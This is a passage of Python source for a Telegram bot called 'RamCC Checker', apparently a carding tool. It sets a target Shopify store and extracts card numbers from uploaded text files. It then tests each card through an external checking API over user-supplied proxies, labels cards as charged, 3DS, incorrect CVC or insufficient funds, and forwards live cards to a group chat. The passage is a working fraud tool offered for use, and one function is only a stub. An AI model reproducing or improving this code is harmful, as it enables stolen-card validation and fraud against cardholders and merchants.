You also have access to all regular user commands. Use your new privileges responsibly!
"""
        await context.bot.send_message(
            chat_id=target_user_id,
            text=admin_message,
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True
        )
    except Exception as e:
        # If can't send notification, inform the owner
        logger.error(f"Failed to send admin promotion notification to user {target_user_id}: {e}")
        await update.message.reply_text(f"Note: Could not send admin notification to the user. They may not have started the bot yet.")

# Register the promote_admin_command with the application
app.add_handler(CommandHandler("pa", promote_admin_command))

# Add helper function to validate proxy
async def validate_proxy(proxy_str):
    """Check if the proxy is live and working by making a test request."""
    # Just return success without actual validation
    return True, "Proxy validation disabled"
    """
    # Format the proxy for testing
    proxy_dict = None
    proxy_for_aiohttp = None
    
    # Format the proxy based on its type
    if '@' in proxy_str:  # Webshare format
        proxy_for_aiohttp = f"http://{proxy_str}"
        proxy_dict = {
            'http': f'http://{proxy_str}',
            'https': f'https://{proxy_str}'
        }
    else:
        parts = proxy_str.split(':')
        if len(parts) == 2:  # ip:port
            proxy_for_aiohttp = f"http://{parts[0]}:{parts[1]}"
            proxy_dict = {
                'http': f'http://{proxy_str}',
                'https': f'https://{proxy_str}'
            }
        elif len(parts) >= 4:  # ip:port:user:pass
            proxy_for_aiohttp = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            proxy_auth = f'{parts[2]}:{parts[3]}'
            proxy_url = f'{parts[0]}:{parts[1]}'
            proxy_dict = {
                'http': f'http://{proxy_auth}@{proxy_url}',
                'https': f'https://{proxy_auth}@{proxy_url}'
            }
        else:
            return False, "Invalid proxy format"
    
    # Use a timeout for quick response
    timeout = aiohttp.ClientTimeout(total=10)
    
    try:
        # Set proper headers for the request
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Try accessing a reliable test site - with SSL verification enabled
        connector = TCPConnector(force_close=True)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
            logger.info(f"Testing proxy with httpbin.org: {proxy_for_aiohttp}")
            async with session.get("https://httpbin.org/ip", proxy=proxy_for_aiohttp) as resp:
                if resp.status == 200:
                    # Try to get the IP address from the response
                    data = await resp.json()
                    proxy_ip = data.get("origin", "Unknown")
                    logger.info(f"Proxy test successful. IP: {proxy_ip}")
                    return True, proxy_ip
                else:
                    logger.warning(f"Proxy test failed with status: {resp.status}")
                    return False, f"Proxy returned status code: {resp.status}"
    except asyncio.TimeoutError:
        logger.warning("Proxy test timed out")
        return False, "Proxy connection timed out"
    except aiohttp.ClientProxyConnectionError as e:
        logger.warning(f"Proxy connection error: {str(e)}")
        return False, "Failed to connect to proxy"
    except aiohttp.ClientConnectorError as e:
        logger.warning(f"Client connector error: {str(e)}")
        return False, "Failed to establish connection using proxy"
    except Exception as e:
        logger.warning(f"Proxy validation error: {str(e)}")
        return False, f"Proxy validation error: {str(e)[:100]}"
    """

# Update test_proxy_with_api to use proper proxy configuration and keep SSL verification
async def test_proxy_with_api(proxy_str, test_site="example-site.myshopify.com"):
    """Test if the proxy works specifically with our target API."""
    # Just return success without actual validation
    return True, "API test disabled" 
    """
    logger.info(f"Testing proxy with API: {proxy_str}")
    
    # Format the proxy for aiohttp
    proxy_url = None
    if '@' in proxy_str:  # Webshare format
        proxy_url = f"http://{proxy_str}"
    else:
        parts = proxy_str.split(':')
        if len(parts) == 2:  # ip:port
            proxy_url = f"http://{parts[0]}:{parts[1]}"
        elif len(parts) >= 4:  # ip:port:user:pass
            proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    
    if not proxy_url:
        return False, "Invalid proxy format"
    
    # Build a test request to our API
    test_url = f"{API_URL}?link={test_site}&bearer={BEARER}&cc={DEFAULT_CC}"
    
    try:
        # Create a client session with SSL verification
        connector = TCPConnector(force_close=True)
        timeout = aiohttp.ClientTimeout(total=15)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
            # First check if we can get our own IP through the proxy
            try:
                ip_check_url = "https://api.ipify.org?format=json"
                logger.info(f"Checking proxy IP via ipify.org with proxy: {proxy_url}")
                async with session.get(ip_check_url, proxy=proxy_url) as ip_resp:
                    if ip_resp.status == 200:
                        ip_data = await ip_resp.json()
                        proxy_ip = ip_data.get("ip", "Unknown")
                        logger.info(f"Proxy IP check successful: {proxy_ip}")
                    else:
                        logger.warning(f"Proxy IP check failed with status: {ip_resp.status}")
            except Exception as e:
                logger.warning(f"Proxy IP check failed: {str(e)}")
            
            # Now test the actual API
            logger.info(f"Testing API with proxy: {proxy_url}")
            async with session.get(test_url, proxy=proxy_url) as resp:
                if resp.status != 200:
                    logger.warning(f"API test failed with status: {resp.status}")
                    return False, f"API returned status code: {resp.status}"
                
                text = await resp.text()
                logger.info(f"API test response: {text[:100]}")
                
                # If we got HTML instead of JSON, the proxy might not be working
                if text.strip().startswith(('<!DOCTYPE', '<html')):
                    logger.warning("API returned HTML instead of JSON")
                    return False, "API returned HTML instead of JSON (proxy might not be working)"
                
                try:
                    json.loads(text)  # Just try to parse it
                    logger.info("API returned valid JSON response")
                    return True, "API returned valid JSON response"
                except json.JSONDecodeError:
                    logger.warning("API returned invalid JSON response")
                    return False, "API returned invalid JSON response"
    
    except aiohttp.ClientProxyConnectionError as e:
        logger.warning(f"Proxy connection error: {str(e)}")
        return False, "Could not connect to proxy"
    except aiohttp.ClientConnectorError as e:
        logger.warning(f"Connection error: {str(e)}")
        return False, f"Connection error: {str(e)}"
    except asyncio.TimeoutError:
        logger.warning("Request timed out")
        return False, "Request timed out"
    except Exception as e:
        logger.warning(f"Error testing proxy: {str(e)}")
        return False, f"Error testing proxy: {str(e)}"
    """

# Update agql_command to use SSL verification
async def agql_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if we're in a private chat
    chat_type = update.effective_chat.type
    if chat_type != "private":
        # In groups, just send a message suggesting to use it in private chat
        return await BotUtils.send_response(
            update,
            f"⚠️ The /agql command can only be used in private chat.\n\nPlease message @RamCC_checker directly to set your default site, then use /chk in groups."
        )
        
    user_id = update.effective_user.id
    
    # Check if user is authorized
    authorized, reason = await check_authorization(update, context, False, "agql")
    if not authorized:
        await update.message.reply_text(f"❌ {reason}")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /agql <site>")
        return

    site = context.args[0]
    
    # Ensure site is properly formatted
    if 'http' in site.lower():
        # Extract domain from URL
        parsed_url = urlparse(site)
        site = parsed_url.netloc or parsed_url.path
        # Remove www. if present
        if site.startswith('www.'):
            site = site[4:]
            
    # Store the formatted site
    user_sites[update.effective_user.id] = site
    
    # Check if user has a proxy set
    proxy_str = None
    proxy_status = "❌ Disabled"
    proxy_ip_info = ""
    
    if user_id in user_proxies:
        if isinstance(user_proxies.get(user_id, None), dict):
            # New format with IP information
            proxy_str = user_proxies[user_id]['full']
            proxy_status = "✅ Enabled"
            proxy_ip_info = f"\n{DEV_LINK} 🌐 Proxy IP: <code>{user_proxies[user_id]['ip']}</code>"
        elif user_id in user_proxies:
            # Old format compatibility
            proxy_str = user_proxies[user_id]
            proxy_status = "✅ Enabled"
    
    # Send processing message
    processing_msg = await update.message.reply_text("🔍 Checking site...")
    
    # Get owner name
    owner_name = await get_owner_name_link(context)
    
    # Fetch gate type using API
    url = f"{API_URL}?link={site}&bearer={BEARER}&cc={DEFAULT_CC}"
    gate_type = "Shopify Normal"
    amount = "Unknown"
    
    try:
        # Create a client session WITH SSL verification
        connector = TCPConnector(force_close=True)  # Keep force_close for connection reliability
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
            # Configure proxy for request if set
            proxy = None
            if proxy_str:
                # For aiohttp, we need to format the proxy URL correctly
                if '@' in proxy_str:  # Webshare format (username:password@p.webshare.io:80)
                    # Use the full proxy string directly with http:// prefix
                    proxy = f"http://{proxy_str}"
                else:
                    parts = proxy_str.split(':')
                    if len(parts) == 2:  # ip:port
                        proxy = f"http://{parts[0]}:{parts[1]}"
                    elif len(parts) >= 4:  # ip:port:user:pass
                        proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            
            try:
                # Log the request being made
                logger.info(f"/agql request for site {site} with proxy: {proxy}")
                
                # Make the API request with proxy if set
                async with session.get(url, proxy=proxy, timeout=30) as resp:
                    # Log response status and headers for debugging
                    logger.info(f"Response status: {resp.status}, Content-Type: {resp.headers.get('Content-Type', 'unknown')}")
                    
                    text = await resp.text()
                    
                    # Check if response is HTML instead of JSON
                    if text.strip().startswith(('<!DOCTYPE', '<html')):
                        logger.error(f"Invalid API response (HTML received) in /agql for site {site}: {text[:100]}")
                        await processing_msg.edit_text(
                            f"❌ Invalid response from API. The site '{site}' might not be a valid Shopify site or might be protected.\n\n"
                            f"Try a different site or contact the bot owner."
                        )
                        return
                    
                    try:
                        response_data = json.loads(text)
                        if "TypeX" in response_data:
                            gate_type = "Shopify + " + response_data["TypeX"]
                        else:
                            gate_type = "Shopify Normal"
                            
                        if "Amount" in response_data:
                            amount = response_data["Amount"]
                        else:
                            amount = "Unknown"
                    except json.JSONDecodeError:
                        logger.error(f"Invalid API response (not JSON) in /agql for site {site}: {text[:100]}")
                        await processing_msg.edit_text(
                            f"❌ Cannot parse API response. The site '{site}' might not be a valid Shopify site.\n\n"
                            f"Try a different site or contact the bot owner if this issue persists."
                        )
                        return
            except aiohttp.ClientProxyConnectionError as proxy_error:
                logger.error(f"Proxy connection error in /agql for site {site}: {str(proxy_error)}")
                await processing_msg.edit_text(
                    f"❌ Proxy connection error. Your proxy may be invalid or expired.\n\n"
                    f"Please set a new proxy with /set_proxy and try again."
                )
                return
            except aiohttp.ClientConnectorError as conn_error:
                logger.error(f"Connection error in /agql for site {site}: {str(conn_error)}")
                await processing_msg.edit_text(
                    f"❌ Connection error. Could not connect to the API or site.\n\n"
                    f"Error: {str(conn_error)[:100]}"
                )
                return
            except asyncio.TimeoutError:
                logger.error(f"Timeout in /agql for site {site}")
                await processing_msg.edit_text(
                    f"❌ Request timed out. The site or API might be slow or unreachable."
                )
                return
    except Exception as e:
        logger.error(f"Error fetching gate info in /agql for site {site}: {str(e)}")
        await processing_msg.edit_text(
            f"❌ An error occurred: {str(e)[:100]}\n\n"
            f"Try again or contact the bot owner if the issue persists."
        )
        return
        
    # Format response in specified UI
    formatted_response = f"""{RAM_ICON} RamCC Checker| Site Added ✅
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
{DEV_LINK} 𝐒𝐢𝐭𝐞: https://{site}
{DEV_LINK} 𝐎𝐫𝐝𝐞𝐫'𝐬 𝐏𝐫𝐢𝐜𝐞: {amount}$
{DEV_LINK} 𝐆𝐚𝐭𝐞: {gate_type}
{DEV_LINK} 𝐔𝐬𝐞: /mass or /chk
{DEV_LINK} 𝐏𝐫𝐨𝐱𝐲: {proxy_status}{proxy_ip_info}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}"""
    
    # Update the processing message
    await processing_msg.edit_text(formatted_response, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

# Update gql_command similarly
async def gql_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... existing code ...
    
    # Make API request WITH SSL verification
    connector = TCPConnector(force_close=True)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        try:
            # ... existing site formatting ...
            
            # Configure proxy for request if set
            proxy = None
            if proxy_str:
                # For aiohttp, we need to format the proxy URL correctly
                if '@' in proxy_str:  # Webshare format (username:password@p.webshare.io:80)
                    # Use the full proxy string directly with http:// prefix
                    proxy = f"http://{proxy_str}"
                else:
                    parts = proxy_str.split(':')
                    if len(parts) == 2:  # ip:port
                        proxy = f"http://{parts[0]}:{parts[1]}"
                    elif len(parts) >= 4:  # ip:port:user:pass
                        proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            
            # Log the API request
            logger.info(f"Making API request to API URL with proxy: {proxy}")
            
            # Make the API request with proxy if set
            async with session.get("API_URL", proxy=proxy, timeout=30) as resp:
                # Handle response
                pass
        except Exception as e:
            logger.error(f"Error in gql_command: {str(e)}")
            await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
            return

# /txt (reply to message) → Convert message to .txt file
async def txt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check authorization
    authorized, reason = await check_authorization(update, context, False, "txt")
    if not authorized:
        await update.message.reply_text(f"❌ {reason}")
        return
    
    # Check if replying to a message
    if not update.message.reply_to_message:
        await update.message.reply_text("❌ Reply to a message to convert it to a txt file.")
        return
    
    # Get message text
    reply = update.message.reply_to_message
    if not reply.text and not reply.caption:
        await update.message.reply_text("❌ No text found in the message to convert.")
        return
    
    message_text = reply.text or reply.caption
    
    # Generate a filename
    file_name = f"ram_message_{int(time.time())}.txt"
    
    # Create file in memory
    file_obj = BytesIO(message_text.encode('utf-8'))
    file_obj.name = file_name
    
    # Get owner name
    owner_name = await get_owner_name_link(context)
    
    # Send the file
    await update.message.reply_document(
        document=file_obj,
        filename=file_name,
        caption=f"""📄 {RAM_ICON} Message to .txt Conversion
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} File: {file_name}
{DEV_LINK} Size: {len(message_text)} characters
{DEV_LINK} Lines: {message_text.count('\n') + 1}
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}""",
        parse_mode=constants.ParseMode.HTML
    )

# /flt (reply to .txt) → Filter valid CCs from file
async def flt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check authorization
    authorized, reason = await check_authorization(update, context, False, "flt")
    if not authorized:
        await update.message.reply_text(f"❌ {reason}")
        return
    
    # Check if replying to a file
    reply = update.message.reply_to_message
    if not reply or not reply.document:
        await update.message.reply_text("❌ Please reply to a .txt file with CCs to filter.")
        return
    
    # Check file extension
    document = reply.document
    file_name = document.file_name
    
    if not file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files are supported for filtering.")
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text("🔍 Processing file... Please wait.")
    
    try:
        # Download the file
        file = await document.get_file()
        content = await file.download_as_bytearray()
        
        # Decode the content
        try:
            text_content = content.decode('utf-8')
        except UnicodeDecodeError:
            # Try another common encoding if UTF-8 fails
            try:
                text_content = content.decode('latin-1')
            except UnicodeDecodeError:
                await processing_msg.edit_text("❌ Unable to decode file. The file might be corrupt.")
                return
        
        # Split content into lines
        lines = text_content.split('\n')
        
        # CC regex pattern that supports multiple separator formats (|, :, /)
        cc_pattern = r'\b(?:\d{13,19})(?:[|:/]+)(?:\d{1,2})(?:[|:/]+)(?:\d{2,4})(?:[|:/]+)(?:\d{3,4})\b'
        
        # Find all CCs in the file
        filtered_ccs = []
        
        for line in lines:
            line = line.strip()
            matches = re.findall(cc_pattern, line)
            if matches:
                filtered_ccs.extend(matches)
        
        # Check if any CCs were found
        if not filtered_ccs:
            await processing_msg.edit_text("❌ No valid credit card patterns found in the file.")
            return
        
        # Remove duplicates while preserving order
        unique_ccs = []
        seen = set()
        for cc in filtered_ccs:
            if cc not in seen:
                seen.add(cc)
                unique_ccs.append(cc)
        
        # Create the output file
        output_content = "\n".join(unique_ccs)
        output_file = BytesIO(output_content.encode('utf-8'))
        output_file.name = f"filtered_{file_name}"
        
        # Get owner name
        owner_name = await get_owner_name_link(context)
        
        # Send the filtered file
        await processing_msg.edit_text(
            f"✅ Found {len(unique_ccs)} unique valid CC patterns ({len(filtered_ccs) - len(unique_ccs)} duplicates removed)."
        )
        
        await update.message.reply_document(
            document=output_file,
            filename=output_file.name,
            caption=f"""📊 {RAM_ICON} CC Filter Results
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Source File: {file_name}
{DEV_LINK} Total Lines: {len(lines)}
{DEV_LINK} Total CCs: {len(filtered_ccs)}
{DEV_LINK} Unique CCs: {len(unique_ccs)}
{DEV_LINK} Duplicates: {len(filtered_ccs) - len(unique_ccs)}
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}""",
            parse_mode=constants.ParseMode.HTML
        )
        
    except Exception as e:
        logger.error(f"Error in flt_command: {str(e)}")
        await processing_msg.edit_text(f"❌ An error occurred: {str(e)[:200]}")
        return

# Process uploaded files with CCs
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if the user is authorized
    authorized, reason = await check_authorization(update, context, False, "file")
    if not authorized:
        await update.message.reply_text(f"❌ {reason}")
        return
    
    # Check file type
    document = update.message.document
    file_name = document.file_name
    
    # Only allow text files
    if not file_name.lower().endswith(('.txt', '.csv', '.log')):
        return  # Silently ignore non-text files
    
    # Send processing message
    processing_msg = await update.message.reply_text("📄 Processing file...")
    
    try:
        # Download the file
        file = await document.get_file()
        content = await file.download_as_bytearray()
        
        # Decode the content - try UTF-8 first, then Latin-1
        try:
            text_content = content.decode('utf-8')
        except UnicodeDecodeError:
            try:
                text_content = content.decode('latin-1')
            except UnicodeDecodeError:
                await processing_msg.edit_text("❌ Unable to decode file.")
                return
        
        # CC regex pattern
        cc_pattern = r'\b(?:\d{13,19})(?:[|:/]+)(?:\d{1,2})(?:[|:/]+)(?:\d{2,4})(?:[|:/]+)(?:\d{3,4})\b'
        
        # Find all CCs in the file
        ccs = re.findall(cc_pattern, text_content)
        
        # Remove duplicates while preserving order
        unique_ccs = []
        seen = set()
        for cc in ccs:
            if cc not in seen:
                seen.add(cc)
                unique_ccs.append(cc)
        
        # Store in user data for mass command
        context.user_data["cc_list"] = unique_ccs
        
        if not unique_ccs:
            await processing_msg.edit_text("❌ No valid credit card patterns found in the file.")
            return
        
        # Get owner name
        owner_name = await get_owner_name_link(context)
        
        # Show success message
        await processing_msg.edit_text(
            f"""✅ {RAM_ICON} File Processed
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} File: {file_name}
{DEV_LINK} CCs Found: {len(unique_ccs)} unique ({len(ccs)} total)
{DEV_LINK} Duplicates: {len(ccs) - len(unique_ccs)}
{DEV_LINK} Next Steps:
{DEV_LINK} • Use /mass to check all CCs against your default site
{DEV_LINK} • OR use /chk for individual CCs
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}""",
            parse_mode=constants.ParseMode.HTML
        )
        
        # Send a sample of CCs if there are many
        if len(unique_ccs) > 5:
            sample = unique_ccs[:5]
            sample_text = '\n'.join(sample)
            await update.message.reply_text(
                f"📝 Sample of loaded CCs:\n<code>{sample_text}</code>\n\n...and {len(unique_ccs) - 5} more",
                parse_mode=constants.ParseMode.HTML
            )
        else:
            # Show all CCs if only a few
            all_ccs = '\n'.join(unique_ccs)
            await update.message.reply_text(
                f"📝 Loaded CCs:\n<code>{all_ccs}</code>",
                parse_mode=constants.ParseMode.HTML
            )
            
    except Exception as e:
        logger.error(f"Error in handle_file: {str(e)}")
        await processing_msg.edit_text(f"❌ Error processing file: {str(e)[:200]}")
        return

# /chk CC → Check CC against saved site
async def check_cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check authorization
    authorized, reason = await check_authorization(update, context, False, "chk")
    if not authorized:
        await update.message.reply_text(f"❌ {reason}")
        return
    
    # Check if default site is set
    if user_id not in user_sites:
        await update.message.reply_text(
            "❌ You need to set a default site first using /agql <site>\n"
            "Example: /agql example.com"
        )
        return
    
    site = user_sites[user_id]
    
    # Check if CC is provided
    if not context.args:
        await update.message.reply_text(
            "Usage: /chk CC1 [CC2] [CC3]...\n"
            "Example: /chk 4111111111111111|12|25|123"
        )
        return
    
    # Get CCs from args (support multiple CCs)
    ccs = context.args
    
    # Apply limit of MAX_CCS_PER_REQUEST CCs per request
    if len(ccs) > MAX_CCS_PER_REQUEST:
        await update.message.reply_text(
            f"⚠️ Maximum {MAX_CCS_PER_REQUEST} CCs allowed per request.\n"
            f"You provided {len(ccs)} CCs. Please reduce the number of CCs or use /mass for bulk checking."
        )
        ccs = ccs[:MAX_CCS_PER_REQUEST]  # Take only the first MAX_CCS_PER_REQUEST CCs
    
    # Get proxy info
    proxy_str = None
    proxy_status = "❌ Disabled"
    proxy_ip_info = ""
    
    if user_id in user_proxies:
        if isinstance(user_proxies[user_id], dict):
            # New format with IP information
            proxy_str = user_proxies[user_id]['full']
            proxy_status = "✅ Enabled"
            proxy_ip_info = f"\n{DEV_LINK} 🌐 Proxy IP: <code>{user_proxies[user_id]['ip']}</code>"
        else:
            # Old format compatibility
            proxy_str = user_proxies[user_id]
            proxy_status = "✅ Enabled"
    
    # Send processing message
    processing_msg = await update.message.reply_text(f"🔍 Checking {len(ccs)} CC(s) against {site}...")
    
    # Process each CC
    results = []
    error_count = 0
    
    for cc in ccs:
        # Normalize CC format for API
        normalized_cc = normalize_cc_format(cc)
        
        # Build API URL
        api_url = f"{API_URL}?link={site}&bearer={BEARER}&cc={normalized_cc}"
        
        try:
            # Configure proxy for request if set
            proxy = None
            if proxy_str:
                # For aiohttp, we need to format the proxy URL correctly
                if '@' in proxy_str:  # Webshare format
                    proxy = f"http://{proxy_str}"
                else:
                    parts = proxy_str.split(':')
                    if len(parts) == 2:  # ip:port
                        proxy = f"http://{parts[0]}:{parts[1]}"
                    elif len(parts) >= 4:  # ip:port:user:pass
                        proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            
            # Create a client session with proper settings
            connector = TCPConnector(force_close=True)
            
            async with aiohttp.ClientSession(connector=connector) as session:
                # Make the API request with proxy if set
                async with session.get(api_url, proxy=proxy, timeout=30) as resp:
                    text = await resp.text()
                    
                    # Check if response is HTML instead of JSON
                    if text.strip().startswith(('<!DOCTYPE', '<html')):
                        results.append({
                            "cc": cc,
                            "error": True,
                            "message": "Invalid API response (HTML received)"
                        })
                        error_count += 1
                        continue
                    
                    try:
                        response_data = json.loads(text)
                        
                        # Extract key information
                        status = response_data.get('Status', 'Unknown')
                        response_code = response_data.get('Response', 'Unknown')
                        gateway = "Shopify" + response_data.get('TypeX', 'Normal')
                        
                        # Check for 3DS
                        if any(phrase in status.lower() for phrase in ["3ds", "3d secure", "verification", "verified", "authentication"]) or \
                           any(phrase in response_code.lower() for phrase in ["3ds", "3d secure", "verification", "verified", "authentication", "authorize", "authorize.net"]):
                            status_emoji = "🔒"
                            result_type = "3DS"
                            is_live = False
                        # Check for incorrect CVC
                        elif "incorrect_cvc" in response_code.lower() or "incorrect cvc" in response_code.lower() or \
                             "incorrect_cvc" in status.lower() or "incorrect cvc" in status.lower():
                            status_emoji = "🔑"
                            result_type = "INCORRECT CVC"
                            is_live = True  # Consider as live since the card is valid
                        # Check for insufficient funds
                        elif "insufficient_funds" in response_code.lower() or "insufficient funds" in response_code.lower() or "insufficient_funds" in status.lower() or "insufficient funds" in status.lower():
                            status_emoji = "💸"
                            result_type = "INSUFFICIENT FUNDS"
                            is_live = False
                        # Only check for charged/success if not already identified
                        elif "approved" in status.lower() or "success" in status.lower() or "charged" in status.lower() or \
                             "order placed" in response_code.lower() or "placed" in response_code.lower() or "order_confirm" in response_code.lower():
                            status_emoji = "🔥"
                            result_type = "CHARGED"
                            is_live = True
                        elif "declined" in status.lower() or "declined" in response_code.lower():
                            status_emoji = "❌"
                            result_type = "DECLINED"
                            is_live = False
                        else:
                            status_emoji = "⚠️"
                            result_type = "ERROR"
                            is_live = False
                        
                        # Format result for display
                        if is_live or result_type in ["3DS", "INSUFFICIENT FUNDS", "INCORRECT CVC"]:
                            # Premium format for charged/live cards
                            formatted_result = f"""{RAM_ICON} CC Check Result
━━━━━━━━━━━━━
{DEV_LINK} 𝐂𝐚𝐫𝐝: <code>{cc}</code>
{DEV_LINK} 𝐎𝐫𝐝𝐞𝐫'𝐬 𝐏𝐫𝐢𝐜𝐞: {response_data.get('Amount', 'Unknown')}$
{DEV_LINK} 𝐓𝐲𝐩𝐞: {gateway}
{DEV_LINK} 𝐒𝐭𝐚𝐭𝐮𝐬: {result_type == "CHARGED" and "Charged!" or result_type == "3DS" and "Approved" or result_type == "INSUFFICIENT FUNDS" and "Approved" or result_type == "INCORRECT CVC" and "Approved" or status} {status_emoji}
{DEV_LINK} 𝐑𝐞𝐬𝐮𝐥𝐭: {result_type == "3DS" and "OTP REQUIRED" or result_type == "INSUFFICIENT FUNDS" and "INSUFFICIENT FUNDS" or result_type == "INCORRECT CVC" and "INCORRECT CVC" or response_code}
{DEV_LINK} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: #GraphQL | {result_type}
{DEV_LINK} 𝐏𝐫𝐨𝐱𝐲: {proxy_status}{proxy_ip_info}
━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}"""
                        else:
                            # Simpler format for declined cards
                            formatted_result = f"""{RAM_ICON} CC Check Result
━━━━━━━━━━━━━
{DEV_LINK} 𝐂𝐚𝐫𝐝: <code>{cc}</code>
{DEV_LINK} 𝐒𝐭𝐚𝐭𝐮𝐬: {status} {status_emoji}
{DEV_LINK} 𝐑𝐞𝐬𝐮𝐥𝐭: {response_code}
{DEV_LINK} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: #GraphQL | DECLINED
{DEV_LINK} 𝐏𝐫𝐨𝐱𝐲: {proxy_status}
━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}"""
                        
                        # Add formatted response to results
                        results.append({
                            "cc": cc,
                            "error": False,
                            "message": formatted_result,
                            "is_live": is_live,
                            "result_type": result_type
                        })
                        
                    except json.JSONDecodeError:
                        # JSON parsing error
                        results.append({
                            "cc": cc,
                            "error": True,
                            "message": f"Invalid API response for CC: {cc}"
                        })
                        error_count += 1
        
        except Exception as e:
            # General error
            results.append({
                "cc": cc,
                "error": True,
                "message": f"Error checking CC {cc}: {str(e)[:100]}"
            })
            error_count += 1
    
    # Update processing message
    await processing_msg.edit_text(f"✅ Completed checking {len(ccs)} CC(s) against {site}")
    
    # Send results
    live_count = sum(1 for r in results if not r["error"] and r.get("is_live", False))
    threeds_count = sum(1 for r in results if not r["error"] and r.get("result_type") == "3DS")
    
    for result in results:
        await update.message.reply_text(
            result["message"],
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True
        )
    
    # If in a group, try to forward live cards to the live cards group
    if live_count > 0 and update.effective_chat.type in ["group", "supergroup"]:
        try:
            # Get owner name
            owner_name = await get_owner_name_link(context)
            
            # Find live cards
            for result in results:
                if not result["error"] and result.get("is_live", False):
                    cc = result["cc"]
                    
                    # Send to live cards group
                    live_notification = f"""#LiveCard #AutoShopify | Ram X Checker
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
💳 𝐂𝐂: <code>{cc}</code>
💵 𝐀𝐦𝐨𝐮𝐧𝐭: Unknown$
🧩 𝐆𝐚𝐭𝐞: Shopify
✨ 𝐒𝐭𝐚𝐭𝐮𝐬: Charged! 🔥
📝 𝐑𝐞𝐬𝐮𝐥𝐭: Approved
🌐 𝐏𝐫𝐨𝐱𝐲: {proxy_status}{'' if not proxy_ip_info else f' | IP: {user_proxies[user_id]["ip"]}' if isinstance(user_proxies.get(user_id), dict) else ''}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
👤 𝐔𝐬𝐞𝐫: {BotUtils.get_user_identifier(update.effective_user)}
⚡ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {owner_name}"""
                    
                    await context.bot.send_message(
                        chat_id=LIVE_CARDS_GROUP,
                        text=live_notification,
                        parse_mode=constants.ParseMode.HTML,
                        disable_web_page_preview=True
                    )
        except Exception as e:
            logger.error(f"Error forwarding live card to group: {str(e)}")

# Update src_command alias
async def src_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Alias for the scr_command function."""
    return await scr_command(update, context)

# Register handlers for functions defined after the initial registration
app.add_handler(CommandHandler("txt", txt_command))
app.add_handler(CommandHandler("flt", flt_command))
app.add_handler(CommandHandler("chk", check_cc_command))

# Now that handle_file is defined, add the handler for file uploads
app.add_handler(MessageHandler(filters.Document.TEXT & ~filters.COMMAND, handle_file))

# Main block to run the bot
if __name__ == "__main__":
    print("Starting RamCC Checker Bot...")
    app.run_polling()
